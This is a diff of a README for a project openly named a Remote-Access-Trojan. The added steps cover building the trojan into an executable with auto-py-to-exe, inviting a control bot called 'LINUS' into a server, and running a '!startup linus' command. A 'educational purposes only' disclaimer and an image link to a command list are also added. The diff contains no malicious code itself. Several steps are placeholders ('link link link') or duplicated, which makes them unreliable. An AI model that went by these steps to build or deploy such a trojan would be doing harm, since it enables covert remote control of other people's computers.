@@ -22,17 +22,44 @@
    - ```bash
       pip install r- requirement.txt
      ```
-     
 
-2. **Open Source**
+2. **Build the EXE**
+   - ```bash
+     yes you are going to build it alone. using py to exe
+     pip install auto-py-to-exe
+     ```
+     
+3. **Invite LINUS in the Server**
+   - ```bash
+     link link link 
+     ```
+
+4. **Invite LINUS in the Server**
+   - ```bash
+     link link link 
+     ```
+     
+4. **Startup**
+   - ```bash
+     !startup linus
+     ```
+       
+
+5. **Open Source**
    - this project is open source - AND EDUCATIONAL PURPOSES ONLY!!
      ```bash
      git clone <RAT>
      cd RAT
      ```
-3. **Commands!**
+6. **Commands!**
 
    ![PssEncoder Demo](https://raw.githubusercontent.com/fqrqh/Remote-Access-Trojan/refs/heads/main/Commands.png)
+
+7. **Demo SOON!**
+
+   ![PssEncoder Demo](https://raw.githubusercontent.com/fqrqh/Remote-Access-Trojan/refs/heads/main/Commands.png)
+
+
 
 ## 📌Contributing
 
